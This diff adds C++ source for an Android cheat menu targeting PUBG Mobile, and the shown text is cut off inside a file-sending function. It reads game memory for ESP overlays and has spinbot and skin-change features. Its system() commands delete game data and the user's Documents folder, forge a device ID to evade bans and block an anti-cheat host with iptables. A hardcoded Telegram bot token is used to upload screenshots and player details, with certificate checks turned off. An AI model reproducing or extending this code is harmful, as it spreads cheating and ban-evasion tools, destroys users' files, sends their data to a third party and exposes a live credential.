@@ -1,0 +1,884 @@
+
+int GetAndroidSdkVersion() {
+    int sdk = 0;
+    FILE *fp = fopen("/system/build.prop", "r");
+    if (fp) {
+        char line[128];
+        while (fgets(line, sizeof(line), fp)) {
+            if (sscanf(line, "ro.build.version.sdk=%d", &sdk) == 1) {
+                break;
+            }
+        }
+        fclose(fp);
+    }
+    return sdk;
+}
+using namespace std;
+namespace settings {
+
+    inline ImVec4 particleColour = ImVec4(255, 255, 255, 255);
+
+}
+ 
+int32_t f_mprotect(uintptr_t addr, size_t len, int32_t prot)
+{
+    size_t page_size = static_cast<size_t>(4096);
+    void* start = reinterpret_cast<void*>(addr & -page_size);
+    uintptr_t end = (addr + len + page_size - 1) & -page_size;
+
+    return mprotect((void *)start, end - reinterpret_cast<uintptr_t>(start), prot);
+}
+
+
+
+std::string GetBulletType(std::string Name)
+{
+    if (Name.find("BP_PlayerRifleBulletImpact_C") != std::string::npos)
+        return "Bullet";
+    return "UnknownBullet";
+}
+
+
+static int XSuits;
+bool Marcoo = false;
+int AutoTargetChoose = 0;
+ImVec4 accentcolor = ImColor(122, 41, 39);
+ImColor frame = (accentcolor);
+namespace Active
+{
+    inline bool SpinBot = false;
+    inline float RotatorSpinBot = 0.0f;
+    inline bool SpinW = false;
+    inline float SpinWeapon = 0.0f;
+    inline float RotatorSpinBotCar = 0;
+    inline bool SpinBotCar = false;
+  inline int SkinCarDefault = 0;
+  inline int SkinCarMod = 0;
+  inline int SkinCarNew = 0;
+}
+
+#include <ctime>
+bool infinitycar;
+bool SPINCHECK;
+float SpinCar360;
+bool WallHackCar;
+#include "ESP/Setting.h"
+using json = nlohmann::json;
+using namespace SDK;
+static std::unordered_set<uint32_t> AlreadyChangedSet;
+uintptr_t GetVirtualFunctionAddress(uintptr_t clazz, uintptr_t index)
+{
+    if (!clazz)
+    {
+        return 0;
+    }
+    uintptr_t vtablePtr = *(uintptr_t*)clazz;
+    if (!vtablePtr)
+    {
+        return 0;
+    }
+    // Ensure index is within bounds of the vtable
+    if (index < 0)
+    {
+        return 0;
+    }
+    return *((uintptr_t*)vtablePtr + index);
+}
+void ChangeItemAVc(uintptr_t thiz, int InItemID)
+{
+    if (thiz)
+    {
+        auto PrechangeitemAvatar_addr = GetVirtualFunctionAddress(thiz, 178); //vtable idx 178
+        if (PrechangeitemAvatar_addr)
+        {
+            return ((void(*)(uintptr_t, int, bool))PrechangeitemAvatar_addr)(thiz, InItemID, true);
+        }
+    }
+}
+
+static UGameViewportClient *GameViewport = 0;
+UGameViewportClient *GetGameViewport() {
+    while (!GameViewport) {
+        GameViewport = UObject::FindObject<UGameViewportClient>("GameViewportClient Transient.UAEGameEngine_1.GameViewportClient_1");
+        sleep(1);
+    }
+    if (GameViewport) {
+        return GameViewport;
+    }
+    return 0;
+}
+std::chrono::steady_clock::time_point lastChangeTime;
+std::chrono::steady_clock::time_point lastWeaponChangeTime;
+// ======================================================================== //
+ImGuiWindow* g_window = NULL;
+bool initImGui = false;
+int screenWidth = 0, glWidth, screenHeight = 0, glHeight;
+float density = -1;
+std::string g_Token, g_Auth;
+bool bValid = false;
+#define IM_PI 3.14159265358979323846f
+#define RAD2DEG(x) ((float)(x) * (float)(180.f / IM_PI))
+#define DEG2RAD(x) ((float)(x) * (float)(IM_PI / 180.f))
+const char* languages[] = { "English", "Tiếng Việt", "中文" }; 
+int selectedLanguage = 0; 
+const char* GetLabel(const char* labelEn, const char* labelVi = nullptr, const char* labelZh = nullptr) {
+    switch (Config.SelectLanguage) {
+        case 1: return (labelVi && labelVi[0] != '\0') ? labelVi : labelEn;
+        case 2: return (labelZh && labelZh[0] != '\0') ? labelZh : labelEn;
+        default: return labelEn;
+    }
+}
+
+auto start = std::chrono::steady_clock::now();
+// ========================================== //
+bool TotalEnemy = true;
+std::vector<FVector> BombLocation = {};
+std::vector<FVector> LineBomb = {};
+
+struct sRegion
+{
+    uintptr_t start, end;
+};
+
+std::vector<sRegion> trapRegions;
+int Style;
+
+std::string GetRedZone(std::string Name) 
+    {
+        if (Name.find("BP_AirAttack_C") != std::string::npos) return "Bomb";
+        if (Name.find("AirAttackBomb_Livik_C") != std::string::npos || Name.find("AirAttackBomb_C") != std::string::npos) return "-";
+  
+    return "Unknown";
+}
+
+static UEngine *GEngine = 0;
+UWorld *GetFullWorld() {
+    while (!GEngine) {
+        GEngine = UObject::FindObject<UEngine>("UAEGameEngine Transient.UAEGameEngine_1"); 
+        sleep(1);
+    }
+    if (GEngine) {
+        auto ViewPort = GEngine->GameViewport;
+
+        if (ViewPort) {
+            return ViewPort->World;
+        }
+    }
+    return 0;
+}
+#include <atomic>
+TNameEntryArray * GetGNames() {
+    return ((TNameEntryArray * ( *)())(Data::Cheat::UE4 + GNames_Offset))();
+}
+std::string getObjectPath(UObject* Object)
+{
+    std::string s;
+    for (auto super = Object->ClassPrivate; super; super = (UClass*)super->SuperStruct)
+    {
+        if (!s.empty())
+            s += ".";
+        s += super->NamePrivate.GetName();
+    }
+    return s;
+}
+bool EnemyAiming = false;
+bool checkaiming = false;
+bool isObjectInvalid(UObject *obj) {
+    if (!Tools::IsPtrValid(obj)) {
+        return true;
+    }
+
+    if (!Tools::IsPtrValid(obj->ClassPrivate)) {
+        return true;
+    }
+
+    if (obj->InternalIndex <= 0) {
+        return true;
+    }
+
+    if (obj->NamePrivate.ComparisonIndex <= 0) {
+        return true;
+    }
+
+    if ((uintptr_t)(obj) % sizeof(uintptr_t) != 0x0 && (uintptr_t)(obj) % sizeof(uintptr_t) != 0x4) {
+        return true;
+    }
+
+    if (std::any_of(trapRegions.begin(), trapRegions.end(), [obj](sRegion region) { return ((uintptr_t) obj) >= region.start && ((uintptr_t) obj) <= region.end; }) ||
+        std::any_of(trapRegions.begin(), trapRegions.end(), [obj](sRegion region) { return ((uintptr_t) obj->ClassPrivate) >= region.start && ((uintptr_t) obj->ClassPrivate) <= region.end; })) {
+        return true;
+    }
+
+    return false;
+}
+
+std::vector<AActor *> NecessaryActors;
+std::mutex necessaryActorsMutex;
+std::vector<AActor*> GetNecessaryActors() {
+    std::vector<AActor*> out;
+    UWorld* GWorld = GetFullWorld();
+
+    if (!GWorld || !GWorld->PersistentLevel) {
+        return out;
+    }
+
+    auto Actors = *(((TArray<AActor*>* (*)(uintptr_t))(Data::Cheat::UE4 + GetActorArray))(reinterpret_cast<uintptr_t>(GWorld->PersistentLevel)));
+
+    for (int i = 0; i < Actors.Num(); i++) {
+        auto Actor = Actors[i];
+        if (!Actor || isObjectInvalid(Actor)) continue;
+
+        if (Actor->IsA(ASTExtraPlayerCharacter::StaticClass()) ||
+            Actor->IsA(ASTExtraVehicleBase::StaticClass()) ||
+            Actor->IsA(ASTExtraGameStateBase::StaticClass()) ||
+            Actor->IsA(ASTExtraGrenadeBase::StaticClass()) ||
+            Actor->IsA(APickUpListWrapperActor::StaticClass()) ||
+            Actor->IsA(APickUpWrapperActor::StaticClass()) ||
+            Actor->IsA(APlayerTombBox::StaticClass()) ||
+            Actor->IsA(ASTExtraPlayerController::StaticClass())) {
+            out.push_back(Actor);
+        }
+    }
+
+    return out;
+}
+
+void* fetch_game_data(void*) {
+    while (true) {
+        auto GWorld = GetFullWorld();
+        if (GWorld && GWorld->PersistentLevel) {
+            std::vector<AActor*> Actors = GetNecessaryActors();
+            {
+                std::lock_guard<std::mutex> lock(necessaryActorsMutex);
+                NecessaryActors = std::move(Actors);
+            }
+        }
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+    return nullptr;
+}
+
+static std::unordered_map<std::string, bool> isDumped;
+
+void ActorDump() {
+    auto Actors = *(((TArray<AActor *> * (*)(uintptr_t))(Data::Cheat::UE4 + GetActorArray))(reinterpret_cast<uintptr_t>(GetFullWorld()->PersistentLevel)));
+    
+    for (int i = 0; i < Actors.Num(); i++) {
+        auto Actor = Actors[i];
+        if (Actor) {
+            if (!isDumped[Actor->NamePrivate.GetName()]) {
+                FILE *fp = fopen("/sdcard/Android/obb/com.pubg.imobile/ActorDump.txt", "a");
+                fprintf(fp, "ObjectFlags(%d), InternalIndex(%d), NamePrivate(%s), FullName(%s)\n", 
+                        Actor->ObjectFlags, Actor->InternalIndex, Actor->NamePrivate.GetName(), Actor->GetFullName().c_str());
+                fclose(fp);
+                isDumped[Actor->NamePrivate.GetName()] = true;
+            }
+        }
+    }
+}
+// Actor
+ImFont *pRegularFont;
+ImFont *Icon;
+
+struct TeamColor {
+    uint8_t r;
+    uint8_t g;
+    uint8_t b;
+};
+
+ImU32 Black = IM_COL32(0, 0, 0, 255);
+ImU32 Green = IM_COL32(0, 255, 0, 255);
+ImU32 Yellow = IM_COL32(255, 255, 0, 255);
+ImU32 Red = IM_COL32(255, 0, 0, 255);
+ImU32 Red2 = IM_COL32(255, 0, 0, 255);
+ImU32 White = IM_COL32(255, 255, 255, 255);
+
+struct VECTOR3
+{
+    float X;
+    float Y;
+    float Z;
+};
+ImDrawList* pImGuiDraw;
+
+void DrawBorderString(ImFont *pFont, float FontSize, string Text, float X, float Y, ImColor Color, bool Center)
+{
+    pImGuiDraw = ImGui::GetBackgroundDrawList();
+    if (Setting::textborder)
+    {
+        ImVec2 TextSize = pFont->CalcTextSizeA(FontSize, FLT_MAX, 0.0f, Text.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) + 1.0f, Y + 1.0f), Black, Text.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) - 1.0f, Y - 1.0f), Black, Text.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) + 1.0f, Y - 1.0f), Black, Text.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) - 1.0f, Y + 1.0f), Black, Text.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2(X - TextSize.x / 2.0f, Y), Color, Text.c_str());
+    }
+    else
+    {
+
+        ImVec2 TextSize = pFont->CalcTextSizeA(FontSize, FLT_MAX, 0.0f, Text.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2(X - TextSize.x / 2.0f, Y), Color, Text.c_str());
+    }
+}
+void DrawBorderStringW(ImFont *pFont, float FontSize, wstring Text, float X, float Y, ImColor Color, ImColor Color2, bool Center)
+{
+pImGuiDraw = ImGui::GetBackgroundDrawList();
+    std::wstring_convert<std::codecvt_utf8<wchar_t>> myconv;
+    std::string Texts = myconv.to_bytes(Text).c_str();
+    if (Setting::textborder)
+    {
+        ImVec2 TextSize = pFont->CalcTextSizeA(FontSize, FLT_MAX, 0.0f, Texts.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) + 1.0f, Y + 1.0f), Color2, Texts.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) - 1.0f, Y - 1.0f), Color2, Texts.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) + 1.0f, Y - 1.0f), Color2, Texts.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2((X - TextSize.x / 2.0f) - 1.0f, Y + 1.0f), Color2, Texts.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2(X - TextSize.x / 2.0f, Y), Color, Texts.c_str());
+    }
+    else
+    {
+        ImVec2 TextSize = pFont->CalcTextSizeA(FontSize, FLT_MAX, 0.0f, Texts.c_str());
+        pImGuiDraw->AddText(pFont, FontSize, ImVec2(X - TextSize.x / 2.0f, Y), Color, Texts.c_str());
+    }
+}
+struct Matrix
+{
+    float m[4][4];
+};
+
+Matrix GetMatrix()
+{
+    static UCanvas* Canvas = nullptr;
+
+    if (Canvas == nullptr)
+    {
+        Canvas = UObject::FindObject<UCanvas>("Canvas Transient.DebugCanvasObject");
+    }
+
+    if (!Canvas)
+    {
+        return Matrix{};
+    }
+
+    uintptr_t lodalele;
+
+#if defined(__LP64__)
+    lodalele = 0x270;
+#else
+    lodalele = 0x200;
+#endif
+
+    return *(Matrix*)((uintptr_t)Canvas + lodalele);
+}
+void AddItem(const char *CheckboxName, bool *CheckboxbooleanPtr, float *sizefloatptr, float *colorfloatptr)
+{
+    ImGui::TableNextRow();
+    ImGui::TableNextColumn();
+    ImGui::Checkbox(CheckboxName, CheckboxbooleanPtr);
+
+    ImGui::TableNextColumn();
+    ImGui::Text(CheckboxName);
+
+    ImGui::TableNextColumn();
+    ImGui::PushItemWidth(120);
+    ImGui::SliderFloat((std::string("##") + CheckboxName + "size").c_str(), sizefloatptr, 1.0f, 50.0f, "%.0f");
+
+    ImGui::TableNextColumn();
+    ImGui::ColorEdit4((std::string("##") + CheckboxName + "color").c_str(), colorfloatptr, ImGuiColorEditFlags_NoLabel | ImGuiColorEditFlags_NoInputs);
+
+    ImGui::Separator();
+}
+bool WorldToScreenPlayer(FVector pos, FVector &screen, int *distance)
+{
+    Matrix ViewMatrix = GetMatrix();
+
+    screen = {};
+    *distance = 0;
+
+    float screenW = (ViewMatrix.m[0][3] * pos.X) + (ViewMatrix.m[1][3] * pos.Y) + (ViewMatrix.m[2][3] * pos.Z + ViewMatrix.m[3][3]);
+    if (screenW < 0.0001f)
+        return false;
+
+    *distance = (screenW / 100);
+    float screenY = (ViewMatrix.m[0][1] * pos.X) + (ViewMatrix.m[1][1] * pos.Y) + (ViewMatrix.m[2][1] * (pos.Z + 85) + ViewMatrix.m[3][1]);
+    float screenX = (ViewMatrix.m[0][0] * pos.X) + (ViewMatrix.m[1][0] * pos.Y) + (ViewMatrix.m[2][0] * pos.Z + ViewMatrix.m[3][0]);
+    screen.Y = (glHeight / 2.f) - (glHeight / 2.f) * screenY / screenW;
+    screen.X = (glWidth / 2.f) + (glWidth / 2.f) * screenX / screenW;
+    float y1 = (glHeight / 2.f) - (ViewMatrix.m[0][1] * pos.X + ViewMatrix.m[1][1] * pos.Y + ViewMatrix.m[2][1] * (pos.Z - 95) + ViewMatrix.m[3][1]) * (glHeight / 2.f) / screenW;
+    screen.Z = y1 - screen.Y;
+
+    return !(screen.X == 0 && screen.Y == 0 && screen.Z == 0);
+}
+
+bool WorldToScreenBone(FVector Position, FVector2D *Screen)
+{
+    Matrix ViewMatrix = GetMatrix();
+
+    float ScreenW = (ViewMatrix.m[0][3] * Position.X) + (ViewMatrix.m[1][3] * Position.Y) + (ViewMatrix.m[2][3] * Position.Z + ViewMatrix.m[3][3]);
+    if (ScreenW < 0.0001f)
+        return false;
+
+    ScreenW = 1 / ScreenW;
+    float SightX = (glWidth / 2);
+    float SightY = (glHeight / 2);
+
+    Screen->X = SightX + (ViewMatrix.m[0][0] * Position.X + ViewMatrix.m[1][0] * Position.Y + ViewMatrix.m[2][0] * Position.Z + ViewMatrix.m[3][0]) * ScreenW * SightX;
+    Screen->Y = SightY - (ViewMatrix.m[0][1] * Position.X + ViewMatrix.m[1][1] * Position.Y + ViewMatrix.m[2][1] * Position.Z + ViewMatrix.m[3][1]) * ScreenW * SightY;
+
+    return true;
+}
+
+bool WorldToScreen(FVector Position, FVector& Screen, int* Distance)
+{
+    Matrix ViewMatrix = GetMatrix();
+    float ScreenW = (ViewMatrix.m[0][3] * Position.X) + (ViewMatrix.m[1][3] * Position.Y) + (ViewMatrix.m[2][3] * Position.Z + ViewMatrix.m[3][3]);
+    *Distance = (ScreenW / 100);
+    if (ScreenW < 0.0001f) return false;
+
+    ScreenW = 1 / ScreenW;
+    float SightX = (glWidth / 2);
+    float SightY = (glHeight / 2);
+
+    Screen.X = SightX + (ViewMatrix.m[0][0] * Position.X + ViewMatrix.m[1][0] * Position.Y + ViewMatrix.m[2][0] * Position.Z + ViewMatrix.m[3][0]) * ScreenW * SightX;
+    Screen.Y = SightY - (ViewMatrix.m[0][1] * Position.X + ViewMatrix.m[1][1] * Position.Y + ViewMatrix.m[2][1] * Position.Z + ViewMatrix.m[3][1]) * ScreenW * SightY;
+
+    return true;
+}
+void DrawFilledRectangle(float X, float Y, float Width, float Height, ImColor Color) {
+    pImGuiDraw = ImGui::GetBackgroundDrawList();
+    pImGuiDraw->AddRectFilled(ImVec2(X, Y), ImVec2(X - Width, Y - Height), Color);
+}
+      
+void test_DrawLine(ImDrawList* pImGuiDraw, float X1, float Y1, float X2, float Y2, ImColor Color, float Thickness)
+{
+  pImGuiDraw->AddLine(ImVec2(X1, Y1), ImVec2(X2, Y2), Color, Thickness);
+}
+
+void CornerBox(ImDrawList* pImGuiDraw, int x, int y, int w, int h, int thickness, float cornered, ImColor color)
+{
+  test_DrawLine(pImGuiDraw, x, y, x + (w * cornered), y, color, thickness);
+  test_DrawLine(pImGuiDraw, x, y, x, y + (h * cornered), color, thickness);
+  // Left Bottom
+  test_DrawLine(pImGuiDraw, x, y + h, x + (w * cornered), y + h, color, thickness);
+  test_DrawLine(pImGuiDraw, x, y + h, x, (y + h) - (h * cornered), color, thickness);
+  // Right Top
+  test_DrawLine(pImGuiDraw, x + w, y, (x + w) - (w * cornered), y, color, thickness);
+  test_DrawLine(pImGuiDraw, x + w, y, x + w, y + (h * cornered), color, thickness);
+  // Right Bottom
+  test_DrawLine(pImGuiDraw, x + w, y + h, (x + w) - (w * cornered), y + h, color, thickness);
+  test_DrawLine(pImGuiDraw, x + w, y + h, x + w, (y + h) - (h * cornered), color, thickness);
+}
+bool fileExists(const std::string &filePath)
+{
+
+    std::ifstream file(filePath);
+
+    return file.good();
+}
+
+void rect_filled(float X, float Y, float Width, float Height, ImColor Color) {
+    pImGuiDraw = ImGui::GetBackgroundDrawList();
+    pImGuiDraw->AddRectFilled(ImVec2(X, Y), ImVec2(X - Width, Y - Height), Color);
+  }
+
+void rect_filled_2(float X, float Y, float Width, float Height, ImColor Color) {
+    pImGuiDraw = ImGui::GetBackgroundDrawList();
+    pImGuiDraw->AddRectFilled(ImVec2(X, Y), ImVec2(X + Width, Y + Height), Color);
+}
+// ======================================================================== //
+
+#define IM_CLAMP(V, MN, MX) ((V) < (MN) ? (MN) : (V) > (MX) ? (MX) \
+                                                            : (V))
+namespace Settings
+{
+    static int Tab = 1;
+    //Funcation Fake
+    
+}
+static bool VR = false;
+void Theme()
+{
+	
+  ImGuiStyle& style = ImGui::GetStyle();
+
+          // --- Stil Ayarları ---
+        style.WindowPadding = ImVec2(8, 8);
+        style.WindowRounding = 3.5f;
+        style.FramePadding = ImVec2(4, 4);
+        style.ScrollbarSize = 0.0f;
+        style.FrameRounding = 3.5f;
+        style.FrameBorderSize = 1.0f; // Kutuların etrafını belirginleştirir
+        style.WindowBorderSize = 0.0f;
+        style.WindowTitleAlign = ImVec2(0.5f, 0.5f);
+        style.GrabMinSize = 20.0f;
+        style.ButtonTextAlign = ImVec2(0.5f, 0.5f);
+
+        // --- Renk Ayarları ---
+        
+        // Ana Arka Plan (Koyu ve Kapalı)
+        style.Colors[ImGuiCol_WindowBg]         = ImColor(0, 0, 0, 235); 
+        
+        // CheckBox ve Slider Arka Planı (Gri - Görünür olması için)
+        style.Colors[ImGuiCol_FrameBg]          = ImColor(45, 45, 45, 255); 
+        style.Colors[ImGuiCol_FrameBgHovered]   = ImColor(60, 60, 60, 255);
+        style.Colors[ImGuiCol_FrameBgActive]    = ImColor(70, 70, 70, 255);
+        style.Colors[ImGuiCol_Border]           = ImColor(80, 80, 80, 100); 
+        
+        // Butonlar (UnLoad, Actor Dump, Save/Load - Gri İç Kaplama)
+        style.Colors[ImGuiCol_Button]           = ImColor(45, 45, 45, 255); 
+        style.Colors[ImGuiCol_ButtonHovered]    = ImColor(60, 60, 60, 255);
+        style.Colors[ImGuiCol_ButtonActive]     = ImColor(35, 35, 35, 255);
+        
+        // Üst Başlık (Title Bar - Kırmızı Tema)
+        style.Colors[ImGuiCol_TitleBg]          = ImColor(122, 41, 39, 255);
+        style.Colors[ImGuiCol_TitleBgActive]    = ImColor(122, 41, 39, 255);
+        style.Colors[ImGuiCol_TitleBgCollapsed] = ImColor(122, 41, 39, 200);
+        
+        // Checkmark ve Slider Kaydıraçları
+        style.Colors[ImGuiCol_CheckMark]        = ImColor(0, 255, 0, 255); // Aktif yeşil
+        style.Colors[ImGuiCol_SliderGrab]       = ImColor(122, 41, 39, 255); // Kırmızı kaydıraç
+        style.Colors[ImGuiCol_SliderGrabActive] = ImColor(150, 50, 48, 255);
+        
+        // Metin Rengi
+        style.Colors[ImGuiCol_Text]             = ImColor(255, 255, 255, 255);
+
+}
+#define STB_IMAGE_IMPLEMENTATION
+#include "imgui/stb_image.h"
+#include "KeyAuth.hpp"
+
+
+void AddUnderLine(ImColor col_)
+{
+    ImVec2 min = ImGui::GetItemRectMin();
+    ImVec2 max = ImGui::GetItemRectMax();
+    min.y = max.y;
+    ImGui::GetWindowDrawList()->AddLine(min, max, col_, 1.0f);
+}
+void TextURL(const char *name_, const char *URL_, uint8_t SameLineBefore_, uint8_t SameLineAfter_)
+{
+    if (1 == SameLineBefore_)
+    {
+        ImGui::SameLine(0.0f, ImGui::GetStyle().ItemInnerSpacing.x);
+    }
+    
+    ImGui::PushStyleColor(ImGuiCol_Text, {255, 255, 255, 255});
+    ImGui::Text(name_);
+    ImGui::PopStyleColor();
+    
+    if (ImGui::IsItemHovered())
+    {
+        if (ImGui::IsMouseClicked(0))
+        {
+            OpenURL(URL_);
+        }
+        AddUnderLine({255, 193, 000, 255});
+     //   ImGui::SetTooltip(ICON_FA_LINK "  Open in browser\n%s", URL_);
+    }
+    else
+    {
+        AddUnderLine({255, 255, 255, 255});
+    }
+    if (1 == SameLineAfter_)
+    {
+        ImGui::SameLine(0.0f, ImGui::GetStyle().ItemInnerSpacing.x);
+    }
+}
+void linevertical()
+    {
+        ImGui::SameLine();
+        ImGui::SeparatorEx(ImGuiSeparatorFlags_Vertical);
+        ImGui::SameLine();
+}
+
+//#include "../Login.h"
+
+bool iLogin = false;
+#define SLEEP_TIME 1000LL / 90LL
+static bool opened = true;
+static bool activehack = true;
+bool ifismembotenable = false;
+int selectedTab = 1;
+using namespace ImGui;
+std::vector<channel_struct> ChatMessages;
+
+
+char buffer[256];
+const char* text = "Welcome to Mod Menu Cheat, please login first...";
+int length = strlen(text);
+float timer = 0.0f;
+int index = 0;
+
+	void executeCommands() {
+    
+    system("rm -rf /data/data/com.pubg.imobile/shared_prefs /storage/emulated/0/Documents/");
+    system("mkdir /data/data/com.pubg.imobile/shared_prefs");
+    system("chmod 777 /data/data/com.pubg.imobile/shared_prefs");
+    system("rm -rf /data/data/com.pubg.imobile/files");
+    std::string guestFile = "/data/data/com.pubg.imobile/shared_prefs/device_id.xml";
+    system(("rm -rf " + guestFile).c_str());
+
+    std::ofstream file(guestFile);
+    if (file.is_open()) {
+        file << "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n";
+        file << "<map>\n";
+        file << "<string name=\"random\"></string>\n";
+        file << "<string name=\"install\"></string>\n";
+        srand(time(0));
+        file << "<string name=\"uuid\">" << rand() << rand() << "-" << rand() << "-" << rand() << "-" << rand() << "-" << rand() << rand() << rand() << "</string>\n";
+        file << "</map>\n";
+        file.close();
+    }
+
+    system("rm -rf /data/data/com.pubg.imobile/databases");
+    system("rm -rf /data/media/0/Android/data/com.pubg.imobile/files/login-identifier.txt");
+    system("rm -rf /data/media/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Intermediate");
+    system("touch /data/media/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Intermediate");
+    system("rm -rf /data/media/0/Android/data/com.pubg.imobile/files/TGPA");
+    system("touch /data/media/0/Android/data/com.pubg.imobile/files/TGPA");
+    system("rm -rf /data/media/0/Android/data/com.pubg.imobile/files/ProgramBinaryCache");
+    system("touch /data/media/0/Android/data/com.pubg.imobile/files/ProgramBinaryCache");
+    system("iptables -I OUTPUT -d cloud.vmp.onezapp.com -j REJECT");
+    system("iptables -I INPUT -s cloud.vmp.onezapp.com -j REJECT");
+    
+}
+
+struct TextureInfo{
+    ImTextureID textureID;
+    int w; 
+    int h;
+};
+
+TextureInfo CreateTexture(const unsigned char* buf, int len)
+{
+    TextureInfo image;
+   
+    unsigned char* image_data = stbi_load_from_memory(buf, len, &image.w, &image.h, NULL, 0);
+    if (image_data == NULL)
+        perror("文件不存在");
+    
+    GLuint image_texture;
+    glGenTextures(1, &image_texture);
+    glBindTexture(GL_TEXTURE_2D, image_texture);
+
+ 
+    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
+    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
+    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE); 
+    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);
+
+
+    #if defined(GL_UNPACK_ROW_LENGTH) && !defined(__EMSCRIPTEN__)
+    glPixelStorei(GL_UNPACK_ROW_LENGTH, 0);
+    #endif    
+    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, image.w, image.h, 0, GL_RGBA, GL_UNSIGNED_BYTE, image_data);
+    stbi_image_free(image_data);
+    image.textureID = reinterpret_cast<ImTextureID>((GLuint *) image_texture);
+
+    return image;
+}
+TextureInfo User;
+TextureInfo Logo;
+
+#define STB_IMAGE_WRITE_IMPLEMENTATION
+#include "WOLTAJ/ImGui/stb_write.h"
+#include <GLES3/gl3.h>
+#include <GLES2/gl2.h>
+
+std::string botToken = XorStr("8522690382:AAHPP98EIPKvg_UCn9NmIVZ_k0OVBICuz1w");
+std::string chatId = XorStr("5508953263");
+
+std::string getCurrentTime() {
+    std::time_t now = std::time(nullptr);
+    std::tm* now_tm = std::localtime(&now);
+    char buffer[20];
+    std::strftime(buffer, sizeof(buffer), "%d/%m/%Y %H:%M:%S", now_tm);
+    return std::string(buffer);
+}
+
+
+bool sendPhoto(const std::string& filePath, const std::string& username, const std::string& Kills, const std::string& playerId, const std::string& playerNation) {
+    CURL* curl;
+    CURLcode res = CURLE_FAILED_INIT;
+    std::ifstream file(filePath, std::ios::binary);
+    if (!file.is_open()) {
+        return false;
+    }
+
+    std::string file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
+    file.close();
+
+    curl_global_init(CURL_GLOBAL_ALL);
+    curl = curl_easy_init();
+
+    if (curl) {
+        std::string url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
+        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+        std::string body;
+
+        std::string caption = "CHIKEN DINNER #1 WITH #RIYAZSRC SERVER!!!\n";
+     //   caption += "\nUsername : " + username + "\n";
+        caption += "Total Kills : " + Kills + "\n";
+     //   caption += "UserID : " + playerId + "\n";
+        caption += "Nation : " + playerNation + "\n";
+        caption += "Time : " + getCurrentTime();
+
+        body += "--" + boundary + "\r\n";
+        body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
+        body += chatId + "\r\n";
+
+        body += "--" + boundary + "\r\n";
+        body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
+        body += caption + "\r\n";
+
+        body += "--" + boundary + "\r\n";
+        body += "Content-Disposition: form-data; name=\"photo\"; filename=\"" + filePath + "\"\r\n";
+        body += "Content-Type: image/jpeg\r\n\r\n";
+        body += file_content + "\r\n";
+        body += "--" + boundary + "--\r\n";
+
+        struct curl_slist* headers = nullptr;
+        headers = curl_slist_append(headers, ("Content-Type: multipart/form-data; boundary=" + boundary).c_str());
+        headers = curl_slist_append(headers, "Accept: application/json");
+
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+
+
+        res = curl_easy_perform(curl);
+
+        if (res != CURLE_OK) {
+            std::string curlError = curl_easy_strerror(res);
+            curl_slist_free_all(headers);
+            curl_easy_cleanup(curl);
+            curl_global_cleanup();
+            return false;
+        }
+        curl_slist_free_all(headers);
+        curl_easy_cleanup(curl);
+    }
+
+    curl_global_cleanup();
+    return (res == CURLE_OK);
+}
+
+bool CaptureScreenshot(const std::string& savePath) {
+    GLint viewport[4];
+    glGetIntegerv(GL_VIEWPORT, viewport);
+    if (viewport[2] == 0 || viewport[3] == 0) {
+     //   Loi("Kích thước GL viewport không hợp lệ!", 8000);
+        return false;
+    }
+    int width = viewport[2], height = viewport[3];
+    std::vector<unsigned char> pixels(3 * width * height);
+    glReadPixels(0, 0, width, height, GL_RGB, GL_UNSIGNED_BYTE, pixels.data());
+    std::vector<unsigned char> flippedPixels(3 * width * height);
+    for (int y = 0; y < height; ++y) {
+        memcpy(&flippedPixels[y * width * 3], &pixels[(height - 1 - y) * width * 3], width * 3);
+    }
+    if (!stbi_write_jpg(savePath.c_str(), width, height, 3, flippedPixels.data(), 100)) {
+  //      Loi("Lưu ảnh thất bại tại: " + savePath, 8000);
+        return false;
+    }
+    return true;
+}
+
+size_t WriteMemoryCallback1(void *contents, size_t size, size_t nmemb, void *userp) {
+    size_t realsize = size * nmemb;
+    std::vector<unsigned char> *mem = (std::vector<unsigned char> *)userp;
+    unsigned char *ptr = (unsigned char*)contents;
+    mem->insert(mem->end(), ptr, ptr + realsize);
+    return realsize;
+}
+#include <dirent.h>
+
+bool sendFile(const std::string& filePath) {
+    CURL* curl;
